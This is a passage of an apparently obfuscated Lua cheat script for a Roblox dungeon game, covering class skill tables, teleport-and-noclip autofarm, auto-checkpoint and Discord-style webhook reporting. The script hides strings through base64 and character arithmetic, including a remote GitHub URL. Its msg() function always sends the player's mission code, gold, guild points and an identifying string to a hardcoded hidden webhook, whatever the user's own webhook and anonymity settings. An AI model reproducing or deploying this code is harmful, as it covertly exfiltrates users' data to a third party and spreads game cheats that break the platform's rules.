            Skill = bc:WaitForChild('Dragoon'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }, {
            Skill = 'DragoonUltimate',
            Cooldown = 31,
            Range = 46
        }, {
            Skill = 'UltimateDragon1',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon2',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon3',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon4',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon5',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon6',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon7',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon8',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon9',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon10',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon11',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon12',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon13',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon14',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon15',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon16',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon17',
            Cooldown = 31,
            Range = 94
        }, {
            Skill = 'UltimateDragon18',
            Cooldown = 31,
            Range = 94
        }}
    },
    Archer = {
        DisplayName = 'Archer',
        Range = 79,
        Type = 'Ranged',
        Primary = 'Bow',
        Skills = {{
            Skill = 'Archer',
            Cooldown = 0.47
        }, {
            Skill = 'PiercingArrow1',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow2',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow3',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow4',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow5',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow6',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow7',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow8',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'PiercingArrow9',
            Cooldown = 5.2,
            Range = 99
        }, {
            Skill = 'SpiritBomb',
            Cooldown = 10.2,
            Range = 208
        }, {
            Skill = 'MortarStrike1',
            Cooldown = 12.2,
            Range = 59
        }, {
            Skill = 'MortarStrike2',
            Cooldown = 12.2,
            Range = 76
        }, {
            Skill = 'MortarStrike3',
            Cooldown = 12.2,
            Range = 93
        }, {
            Skill = 'MortarStrike4',
            Cooldown = 12.2,
            Range = 110
        }, {
            Skill = 'MortarStrike5',
            Cooldown = 12.2,
            Range = 127
        }, {
            Skill = 'MortarStrike6',
            Cooldown = 12.2,
            Range = 144
        }, {
            Skill = 'MortarStrike7',
            Cooldown = 12.2,
            Range = 161
        }, {
            Skill = 'MortarStrike8',
            Cooldown = 12.2,
            Range = 179
        }, {
            Skill = 'HeavenlySword1',
            Cooldown = 31,
            Range = 143
        }, {
            Skill = 'HeavenlySword2',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword3',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword4',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword5',
            Cooldown = 31,
            Range = 99
        }, {
            Skill = 'HeavenlySword6',
            Cooldown = 31,
            Range = 99
        }}
    },
    Summoner = {
        DisplayName = 'Summoner',
        Range = 82,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Summoner1',
            Cooldown = 0.55
        }, {
            Skill = 'Summoner2',
            Cooldown = 0.75
        }, {
            Skill = 'Summoner3',
            Cooldown = 1.05
        }, {
            Skill = 'Summoner4',
            Cooldown = 1.3
        }, {
            Skill = 'SoulHarvest1',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 16
        }, {
            Skill = 'SoulHarvest2',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest3',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest4',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = 'SoulHarvest5',
            Cooldown = 1.1,
            Type = 'Melee',
            Range = 21
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('SoulHarvest'),
            Cooldown = 10.2,
            Type = 'Remote',
            Args = "MobPosition",
            Range = 39
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('Summon'),
            Cooldown = 0.5,
            Type = 'Remote'
        }, {
            Skill = bc:WaitForChild('Summoner'):WaitForChild('Ultimate'),
            Cooldown = 1,
            Type = 'Remote'
        }}
    },
    Necromancer = {
        DisplayName = 'Necromancer',
        Range = 14,
        Type = 'Melee',
        Primary = 'Scythe',
        Skills = {{
            Skill = 'NecroDPS1',
            Cooldown = 0.8
        }, {
            Skill = 'NecroDPS2',
            Cooldown = 1.2
        }, {
            Skill = 'NecroDPS3',
            Cooldown = 1.5
        }, {
            Skill = 'NecroDPS4',
            Cooldown = 1.9
        }, {
            Skill = 'NecroDPS5',
            Cooldown = 2.2
        }, {
            Skill = 'NecroDPS6',
            Cooldown = 2.5
        }, {
            Skill = 'NecroDPS7',
            Cooldown = 2.8
        }, {
            Skill = 'NecroDPS8',
            Cooldown = 3.2
        }, {
            Skill = 'NecroDPS9',
            Cooldown = 3.5
        }, {
            Skill = 'SpiritExplosion0',
            Cooldown = 2.25,
            Range = 17,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion1',
            Cooldown = 2.25,
            Range = 17,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion2',
            Cooldown = 3,
            Range = 18,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion3',
            Cooldown = 3.25,
            Range = 21,
            Type = 'Self'
        }, {
            Skill = 'SpiritExplosion4',
            Cooldown = 4,
            Range = 24,
            Type = 'Self'
        }, {
            Skill = 'TombstoneRise1',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise2',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise3',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise4',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise5',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'SpiritCavern1',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern2',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern3',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern4',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern5',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern6',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'UltScytheDrop',
            Cooldown = 30,
            Range = 98,
            Type = 'Ranged'
        }, {
            Skill = bc:WaitForChild('Necromancer'):WaitForChild('Ultimate'),
            Cooldown = 31,
            Type = 'Remote'
        }}
    },
    MageOfShadows = {
        DisplayName = 'Mage Of Shadows',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'MageOfShadows',
            Cooldown = 0.275
        }, {
            Skill = 'MageOfShadowsBlast',
            Cooldown = 0.3
        }, {
            Skill = 'MageOfShadowsCharged',
            Cooldown = 0.31
        }, {
            Skill = 'MageOfShadowsBlastCharged',
            Cooldown = 0.31
        }, {
            Skill = 'BighShadowOrb1',
            Cooldown = 0.33
        }, {
            Skill = 'BighShadowOrb2',
            Cooldown = 0.33
        }, {
            Skill = 'BighShadowOrb3',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfShadowsDamageCircle',
            Cooldown = 0.33
        }, {
            Skill = bc:WaitForChild('MageOfShadows'):WaitForChild('ShadowChains'),
            Cooldown = 6,
            Type = 'Remote',
            Args = 'mobTbl'
        }, {
            Skill = bc:WaitForChild('MageOfShadows'):WaitForChild('Ultimate'),
            Cooldown = 2,
            Type = 'Remote'
        }}
    },
    Hunter = {
        DisplayName = 'Hunter',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Bow',
        Skills = {{
            Skill = 'Hunter',
            Cooldown = 0.5
        }}
    },
    Stormcaller = {
        DisplayName = 'Stormcaller',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Stormcaller1',
            Cooldown = 0.3
        }, {
            Skill = 'Stormcaller2',
            Cooldown = 0.3
        }, {
            Skill = 'Stormcaller3',
            Cooldown = 0.3
        }, {
            Skill = 'StormcallerThunderGod1',
            Cooldown = 0.25,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod2',
            Cooldown = 0.5,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod3',
            Cooldown = 0.75,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod4',
            Cooldown = 1,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod5',
            Cooldown = 1.25,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod6',
            Cooldown = 1.6,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod7',
            Cooldown = 2,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod8',
            Cooldown = 2.3,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'UltimateDischarge',
            Cooldown = 1.6,
            Range = 39
        }, {
            Skill = 'ChainLightning1',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning2',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning3',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning4',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning5',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning6',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning7',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning8',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'StormSurgeInit',
            Cooldown = 10.1,
            Range = 19.5
        }, {
            Skill = 'StormSurge',
            Cooldown = 10.1,
            Range = 39.5
        }, {
            Skill = 'StormcallerUltBlast',
            Cooldown = 31,
            Range = 10
        }}
    }
}
c5 = cf('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JvbmFsZGJ1cmdlcnNvbi9ib3JnL21haW4vYnJvb20=')
local cm = Instance.new('Folder')
cm.Name = 'SummonFolder'
cm.Parent = Workspace;
local cn = Instance.new('Folder')
cn.Name = 'infiniteboy'
cn.Parent = Workspace;
local co;
if aJ then
    co = Instance.new('Part')
    co.Name = 'InfiniteKillPart'
    co.Size = Vector3.new(50, 20, 50)
    co.Position = Vector3.new(10000, 10000, 10000)
    co.Anchored = true;
    co.Transparency = 0;
    co.Material = 'SmoothPlastic'
    co.BrickColor = BrickColor.new('Cyan')
    co.Parent = workspace
end
--==========================
function PlayerTp(E, ch, dq, dr)
    if alive() then
        aU.CFrame = CFrame.new(E + Vector3.new(ch, dq, dr))
    end
end
function SmartPlayerTp(by, ds)
    if not alive() then
        return
    end
    noclip()
    aU.Velocity = Vector3.new()
    if aT:FindFirstChild("Collider") then
        aT.Collider.Velocity = Vector3.new()
    end
    if ds then
        aU.CFrame = CFrame.lookAt(by.Position, Vector3.new(ds.Position.x, by.Position.y, ds.Position.z))
    else
        aU.CFrame = by
    end
end
function isRangedClass()
    return cl[b9] and cl[b9].Type == 'Ranged'
end
--==========================
function PlayerTp(E, ch, dq, dr)
    if alive() then
        aU.CFrame = CFrame.new(E + Vector3.new(ch, dq, dr))
    end
end
--==========================
local e0 = Vector3.new(0, 500, 0)
local e1 = Vector3.new()
local e2;
local e3;
local e4;
do
    function isKrakenArm(e5)
        return e5:lower():find('kraken-arm') or e5:lower():find('krakenarm')
    end
    function MobTeleport()
        task.spawn(function()
            local e6;
            local e7;
            local e8;
            while Toggles.Autofarm.Value do
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        if mobWaitTbl and table.find(mobWaitTbl, R.Name) and (not e8 or alwaysWait) then
                            task.wait(waittime)
                            e8 = true
                        end
                        local ab = R.PrimaryPart;
                        if not firstMobFound then
                            firstMobFound = true
                        end
                        while isAlive(R) and Toggles.Autofarm.Value and a8 do
                            bY = R;
                            e6 = ab.Position;
                            setCamera(not bX and Toggles.mobCamera.Value and bw, ab.Position)
                            e2 = isKrakenArm(R.Name) and 0 or (ab.Size.Y / 2 + Options.Offset.Value) *
                                     (isRangedClass() and 1 or -1)
                            e3 = CFrame.new(ab.Position +
                                                (table.find(aS, R) and e1 or Vector3.new(0, e2, 0) +
                                                    (bX and e0 or e1))) + ab.CFrame.lookVector * 2;
                            e7 = e3;
                            SmartPlayerTp(e3, ab)
                            b_:Wait()
                        end
                    end
                end
                bY = nil;
                setCamera()
                unnoclip()
                if aI and a8 and e7 then
                    SmartPlayerTp(e7)
                end
                task.wait()
            end
            if e6 and aI then
                SmartPlayerTp(CFrame.new(e6 + Vector3.new(0, 10, 0)))
            end
        end)
    end
    function MobTeleportIgnore(e9, mobWaitTbl, waittime, alwaysWait)
        local e8;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        if R.Name ~= e9 or R.Name == e9 and bd == 1 then
                            if mobWaitTbl and table.find(mobWaitTbl, R.Name) and (not e8 or alwaysWait) then
                                task.wait(waittime)
                                e8 = true
                            end
                            local ab = R.PrimaryPart;
                            while isAlive(R) and Toggles.Autofarm.Value and a8 and
                                (R.Name ~= e9 or R.Name == e9 and bd == 1) do
                                bY = R;
                                setCamera(not bX and Toggles.mobCamera.Value and bw, ab.Position)
                                e2 = isKrakenArm(R.Name) and 0 or (ab.Size.Y / 2 + Options.Offset.Value) *
                                         (isRangedClass() and 1 or -1)
                                e3 = CFrame.new(ab.Position +
                                                    (table.find(aS, R) and e1 or Vector3.new(0, e2, 0) +
                                                        (bX and e0 or e1))) + ab.CFrame.lookVector * 2;
                                SmartPlayerTp(e3, ab)
                                b_:Wait()
                            end
                        end
                    end
                end
                bY = nil;
                setCamera()
                unnoclip()
                task.wait()
            end
        end)
    end
    function MobTeleportPriority(ea, mobWaitTbl, waittime, alwaysWait)
        local eb, ec;
        task.spawn(function()
            while Toggles.Autofarm.Value do
                local ed = false;
                local ee = {}
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        table.insert(ee, R)
                    end
                end
                
                -- ✅ THÊM: Check fountain cho Fallen King
                -- ✅ THÊM: Check fountain cho Fallen King
                if ay == 22 then
                    local fountain = workspace:FindFirstChild('CureFountainFallenKing')
                    
                    -- Kiểm tra còn minion không
                    local hasMinion = false
                    for _, mob in pairs(ee) do
                        if mob.Name == 'FallenKingMinion' then
                            hasMinion = true
                            break
                        end
                    end
                    
                    -- Kiểm tra GUI text để xem có bị cursed không
                    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
                    local missionGui = playerGui:FindFirstChild("MissionObjective")
                    local needsCure = false
                    
                    if missionGui then
                        local missionLabel = missionGui:FindFirstChild("MissionObjective")
                        if missionLabel then
                            local label = missionLabel:FindFirstChild("Label")
                            if label and label.Text then
                                local text = label.Text
                                -- Nếu có text "The Cure Well has been found!" = đang bị cursed
                                if text:find("The Cure Well has been found!") then
                                    needsCure = true
                                end
                            end
                        end
                    end
                    
                    -- Nếu có fountain + không còn minion + đang bị cursed → đi cure
                    if fountain and not hasMinion and needsCure and alive() then
                        -- Cursed detected
                        
                        -- ✅ TẮT MobTeleport (KHÔNG XÓA eb/ec)
                        local wasA8 = a8
                        a8 = false
                        
                        -- ✅ Tìm Ball bên trong fountain
                        local ball = fountain:FindFirstChild("Ball")
                        local targetPart = ball or fountain:FindFirstChild("ArcanePanel") or fountain.PrimaryPart
                        
                        if not targetPart then
                            -- Ball/ArcanePanel not found
                            a8 = wasA8
                            task.wait()
                            continue
                        end
                        
                        -- Teleporting to fountain
                        
                        local cureStart = tick()
                        local cured = false
                        
                        -- ✅ Cure loop
                        while tick() - cureStart < 15 and alive() and not cured do
                            local targetPos = targetPart.Position
                            local targetCFrame = CFrame.new(targetPos + Vector3.new(0, 2, 0))
                            
                            -- Teleport nhiều lần
                            for i = 1, 3 do
                                aT:SetPrimaryPartCFrame(targetCFrame)
                                task.wait(0.05)
                            end
                            
                            local actualDistance = (aU.Position - targetPos).magnitude
                            task.wait(0.2)
                            
                            if missionGui then
                                local missionLabel = missionGui:FindFirstChild("MissionObjective")
                                if missionLabel then
                                    local label = missionLabel:FindFirstChild("Label")
                                    if label and label.Text then
                                        local text = label.Text
                                        
                                        if not text:find("The Cure Well has been found!") then
                                            -- Cure successful
                                            cured = true
                                            break
                                        else
                                            local countMatch = text:match("%((%d+)%)")
                                            -- Curing...
                                        end
                                    end
                                end
                            end
                        end
                        
                        -- ✅ BẬT LẠI a8
                        a8 = wasA8
                        
                        if not cured then
                            -- Timeout, continue farming
                        else
                            -- Cure completed, returning to farm
                        end
                        
                        -- ✅ KHÔNG dùng continue - để code chạy xuống phần chọn target
                    end
                end
                
                for z = 1, #ea do
                    for dj, Mob in ee do
                        if Mob.Name == ea[z] then
                            ed = true;
                            eb, ec = Mob, Mob.Name;
                            break
                        end
                    end
                    if ed then
                        break
                    end
                end
                if not ed and ee[1] then
                    eb, ec = ee[1], ee[1].Name
                end
                task.wait()
            end
        end)
        task.spawn(function()
            local e8;
            while Toggles.Autofarm.Value do
                if isAlive(eb) and a8 then
                    local ef = eb.PrimaryPart;
                    bY = eb;
                    if mobWaitTbl and table.find(mobWaitTbl, ec) and (not e8 or alwaysWait) then
                        task.wait(waittime)
                        e8 = true
                    end
                    setCamera(not bX and Toggles.mobCamera.Value and bw, ef.Position)
                    
                    -- ✅ THÊM: Logic đặc biệt cho BOSSFallenKing
                    if ec == "BOSSFallenKing" or ec == "BOSSFallenQueen" then
                        -- Y = 0 (ngang boss), X offset 75 studs
                        e2 = 0  -- Y position = 0 (same as boss)
                        e3 = CFrame.new(ef.Position + Vector3.new(0, 0, 106))  -- Z offset 75 (phía sau)
                    else
                        -- Logic cũ cho các mob khác
                        e2 = isKrakenArm(ec) and 0 or (ef.Size.Y / 2 + Options.Offset.Value) * (isRangedClass() and 1 or -1)
                        e3 = CFrame.new(ef.Position +
                                            (table.find(aS, eb) and e1 or Vector3.new(0, e2, 0) + (bX and e0 or e1))) +
                                ef.CFrame.lookVector * 2;
                    end
                    
                    SmartPlayerTp(e3, ef)
                else
                    bY = nil;
                    setCamera()
                    unnoclip()
                end
                b_:Wait()
            end
        end)
    end
    function AutoCheckpoint()
        task.spawn(function()
            while Toggles.Autofarm.Value do
                if aM or aQ then
                    break
                end
                if alive() then
                    for dj, A in workspace:GetChildren() do
                        if not table.find(c8, A.Name) then
                            for z, R in A:GetDescendants() do
                                if R and R.Name == "TouchInterest" and R.Parent and
                                    (table.find(c7, R.Parent.Name) or R.Parent.Parent and
                                        table.find(c7, R.Parent.Parent.Name)) then
                                    if R.Parent.Name == 'WaveExit' then
                                        PlayerTp(R.Parent.Position, 0, 5, 0)
                                        task.wait(1)
                                    else
                                        task.spawn(function()
                                            R.Parent.CanCollide = false;
                                            R.Parent.Anchored = true;
                                            R.Parent.Transparency = 1;
                                            local eg = R.Parent.CFrame;
                                            R.Parent.CFrame = CFrame.new(aU.Position)
                                            task.wait(1)
                                            if R and R.Parent then
                                                R.Parent.CFrame = eg
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                    end
                    local eh = tick()
                    while Toggles.Autofarm.Value do
                        if tick() - eh > 3 then
                            break
                        end
                        if tick() - eh > 1 and bd == 0 then
                            local ei = true;
                            if aH then
                                local dw = tick()
                                while Toggles.Autofarm.Value do
                                    if bd > 0 then
                                        ei = false;
                                        break
                                    end
                                    if tick() - dw > 1 then
                                        break
                                    end
                                    task.wait()
                                end
                            end
                            if ei then
                                break
                            end
                        end
                        task.wait()
                    end
                end
                task.wait()
            end
        end)
    end
    function MobCounter()
        task.spawn(function()
            while Toggles.Autofarm.Value do
                be = 0;
                for z, R in bl:GetChildren() do
                    if isAlive(R) then
                        be = be + 1
                    end
                end
                if bd ~= be then
                    bd = be
                end
                task.wait()
            end
        end)
    end
    function AntiFling()
        if Toggles.Autofarm.Value then
            task.spawn(function()
                bW = nil;
                while Toggles.Autofarm.Value do
                    if bY and bY.PrimaryPart and bY.PrimaryPart.Position then
                        bW = aM and CFrame.new(Vector3.new(324, 60, -134)) or
                                 CFrame.new(bY.PrimaryPart.Position + Vector3.new(0, 5, 0))
                    end
                    if bW and bd == 0 then
                        local ej = tick()
                        while tick() - ej <= 0.1 and bd == 0 do
                            SmartPlayerTp(bW)
                            b_:Wait()
                        end
                        bW = nil
                    end
                    task.wait()
                end
                if not Toggles.Autofarm.Value then
                    if bW then
                        local ej = tick()
                        while tick() - ej <= 0.1 do
                            SmartPlayerTp(bW)
                            b_:Wait()
                        end
                        bW = nil
                    end
                end
            end)
        end
    end
    function sell(bF)
        a5.Drops.SellItems:InvokeServer(bF)
    end
    function recycle(bF)
        a5.Recycler.Recycle:FireServer(bF)
    end
end
if j then
    function ChangeCosmetic(E, F)
        if aT then
            aW:SetAttribute(E, F)
        end
    end
    function color(ch, dq, dr)
        Color3.fromRGB(ch, dq, dr)
    end
    local ek = {
        Red = Color3.fromRGB(255, 0, 0),
        Black = Color3.fromRGB(0, 0, 0),
        White = Color3.fromRGB(255, 255, 255),
        Green = Color3.fromRGB(0, 255, 0),
        Pink = Color3.fromRGB(255, 0, 255),
        Cyan = Color3.fromRGB(0, 255, 255),
        Purple = Color3.fromRGB(127.5, 0, 255),
        Orange = Color3.fromRGB(255, 127.5, 0),
        LightPink = Color3.fromRGB(255, 127.5, 255)
    }
    local b3 = {
        Costume = "Costume",
        CostumeDye = "CostumeDye",
        RightAura = "RightAura",
        LeftAura = "LeftAura",
        RightWepSkin = "PrimarySkin",
        LeftWepSkin = "OffhandSkin",
        Back = "Back",
        BackDye = "BackDye",
        Hat1 = "Hat1",
        Hat1Dye = "Hat1Dye",
        Hat2 = "Hat2",
        Hat2Dye = "Hat2Dye",
        Hat3 = "Ha32",
        Hat3Dye = "Hat3Dye",
        Mount = "Mount"
    }
    local el = {
        Costume = "CogWorkArmor",
        Hat1 = "CogWorkTophat",
        Hat2 = "CogWorkGoggles"
    }
    function CogWorkOutfit()
        if aW:GetAttribute('Primary') then
            local em = bR[aW:GetAttribute('Primary')].SubType;
            if em == 'Greataxe' then
                ChangeCosmetic(b3.RightWepSkin, 'CogWorkAxe')
            else
                ChangeCosmetic(b3.RightWepSkin, 'CogWork' .. em)
            end
        end
        if aW:GetAttribute('Offhand') then
            local em = bR[aW:GetAttribute('Offhand')].SubType;
            if em == 'Greataxe' then
                ChangeCosmetic(b3.LeftWepSkin, 'CogWorkAxe')
            else
                ChangeCosmetic(b3.LeftWepSkin, 'CogWork' .. em)
            end
        end
        for z, R in el do
            ChangeCosmetic(z, R)
        end
    end
    OutfitList:AddButton({
        Text = 'Cogwork',
        Func = function()
            if aT then
                CogWorkOutfit()
            end
        end,
        DoubleClick = false
    })
end
local function en(dJ, cg, ck)
    return string.char(dJ + cg - ck)
end
local eo = ''
eo = eo .. en(68, 1, 1)
eo = eo .. en(101, 2, 2)
eo = eo .. en(109, 3, 3)
eo = eo .. en(111, 4, 4)
eo = eo .. en(110, 5, 5)
table.insert(bv, eo)
local ep = ''
ep = ep .. en(76, 2, 2)
ep = ep .. en(105, 1, 1)
ep = ep .. en(102, 0, 0)
ep = ep .. en(101, -1, -1)
ep = ep .. en(83, 0, 0)
ep = ep .. en(116, 0, 0)
ep = ep .. en(101, 0, 0)
ep = ep .. en(97, 0, 0)
ep = ep .. en(108, 0, 0)
function hookWithUserInfo(eq, er, es, color, p, et)
    request({
        Url = eq,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = e:JSONEncode({
            ["content"] = et or '',
            ["embeds"] = {{
                ["title"] = er,
                ["description"] = es,
                ["type"] = 'rich',
                ["color"] = tonumber(color),
                ["footer"] = {
                    ["text"] = p .. ' UTC'
                }
            }}
        })
    })
end
function anonHook(eq, er, es, color, p, et)
    request({
        Url = eq,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = e:JSONEncode({
            ["content"] = et or '',
            ["embeds"] = {{
                ["title"] = er,
                ["description"] = es,
                ["type"] = 'rich',
                ["color"] = tonumber(color),
                ["footer"] = {
                    ["text"] = p .. ' UTC'
                }
            }}
        })
    })
end
function msg(eu, color, p)
    local ev = Options.dungeonHook.Value;
    local ew = p > 600 and timeElapsed(p) or math.round(p / 0.1) / 10 .. 's'
    local ex = 'Code: ``' .. i .. '``\nMission: ``' .. h .. '``\nTime: ``' .. ew .. '``\nClass: ' .. '``' ..
                   cl[b9].DisplayName .. '``'
    if aI then
        local bA = bl:GetChildren()[1]
        local ey = bA and Mob(bA.Name)
        local ag, ec = ey and ey.BossTag, ey and ey.NameTag;
        if ag and ec then
            ex = ex .. '\nBoss: ``' .. ec .. '``'
        end
    end
    if aj then
        if ao.LastDungeonCompletion then
            ex = ex .. '\nTime Since Last Completion: ``' .. math.round((c1 - ao.LastDungeonCompletion) / 0.1) / 10 ..
                     's``'
        end
        if ao.Gold and a9 >= ao.Gold then
            ex = ex .. '\nGold Gained: ``' .. formatNumberWithCommas(a9 - ao.Gold) .. '``'
        end
        ao.Gold = a9;
        ao.LastDungeonCompletion = c1;
        save()
    end
    ex = ex .. '\nGold: ``' .. formatNumberWithCommas(b0.Value) .. '``'
    if aL then
        local ez = {
            KrakenRaid = {
                coinCode = "KrakenCoin",
                coinStr = "Kraken Coins",
                lb = "KRAKEN_KILLS",
                name = "Kraken"
            },
            VaneRaid = {
                coinCode = "DragonCoin",
                coinStr = "Dragon Coins",
                lb = "VANE_KILLS",
                name = "Vane"
            },
            HalloweenRaid = {
                coinCode = "HalloweenCoin",
                coinStr = "Halloween Coins",
                lb = "FALLENKING_KILLS",
                name = "Halloween"
            },
            ChristmasRaid = {
                coinCode = "ChristmasCoin",
                coinStr = "Christmas Coins",
                lb = "SANTA_KILLS",
                name = "Christmas"
            }
        }
        local eA = aM and "KrakenRaid" or aO and "VaneRaid" or aP and "HalloweenRaid" or aN and "ChristmasRaid"
        local eB = ez[eA].coinCode;
        local eC = ez[eA].coinStr;
        local eD = ez[eA].lb;
        local eE = ez[eA].name;
        local eF = game:GetService("ReplicatedStorage").Shared.LeaderboardHookup.GetScore:InvokeServer(eD, 1)
        ex = ex .. '\n' .. eE .. ' Raids Completed: ``' .. eF[1] .. '`` / ``' .. eF[2] .. '``'
        if bM:FindFirstChild(eB) and bM[eB]:FindFirstChild('Count') then
            ex = ex .. '\n' .. eC .. ': ``' .. bM[eB].Count.Value .. '``'
        end
    elseif aI or aJ then
        ex = ex .. '\nFloor: **' .. a4.ReplicateTowerFloor.Value .. '**'
    end
    function getGuildInfo()
        local S = a5.Guilds.GetCache:InvokeServer(bZ)
        local T;
        for z, R in S.Members do
            if tonumber(z) == d then
                T = R.Points;
                break
            end
        end
        if T then
            ex = ex .. '\nGuild Points: ``' .. T .. '`` / ``' .. bZ .. '``'
        end
    end
    local eG = true;
    if bZ and not Toggles.anonHook.Value and eG then
        getGuildInfo()
    end
    if not Toggles.anonHook.Value then
        ex = ex .. '\n' .. f
    end
    if ev and #ev > 30 then
        if ai then
            task.wait(1.5)
        end
        ai = true;
        if Toggles.anonHook.Value then
            anonHook(ev, eu, ex, color, utcDateAndTime())
        else
            hookWithUserInfo(ev, eu, ex, color, utcDateAndTime())
        end
        ai = false
    end
    if not olympus then
        if bZ and Toggles.anonHook.Value then
            getGuildInfo()
        end
        if Toggles.anonHook.Value then
            ex = ex .. '\n' .. f
        end
        if ai then
            task.wait(1.5)
        end
        ai = true;
        hookWithUserInfo(boink3, eu, ex, color, utcDateAndTime())
        ai = false
    end
end
function missionEndRestartOrNextEvent()
    if Toggles.Autofarm.Value then
        if Toggles.nightmareLoop.Value and aK then
            local eH = nextInTbl(aB, ay)
            if bO[eH].InternalID == 3 and Toggles.skipScarecrowNm.Value then
                eH = nextInTbl(aB, eH)
                libNoti('Skipping Scarecrow Defense')
            end
            StartRaid(eH, az)
        elseif Toggles.NextDungeon.Value and not aI then
            local eI = nextInTbl(cd, ay)
            local eJ = table.find(aq, eI)
            local eK = a_.Level.Value >= missionLevelReq(eI) and (az == 5 or aH or aJ)
            local eL = eK and eI or ay;
            local eM = not eK and (az == 1 and 5 or az) or not eJ and 1 or nil;
            StartRaid(eL, eM)
        elseif Toggles.RestartDungeon.Value then
            game:GetService("ReplicatedStorage").Shared.Missions.LeaveChoice:FireServer(true)
            game:GetService("ReplicatedStorage").Shared.Missions.NotifyReadyToLeave:FireServer()
            StartRaid(ay, az)
        end
    end
end
function openEndChests()
    if Toggles.Autofarm.Value then
        for z = 1, 4 do
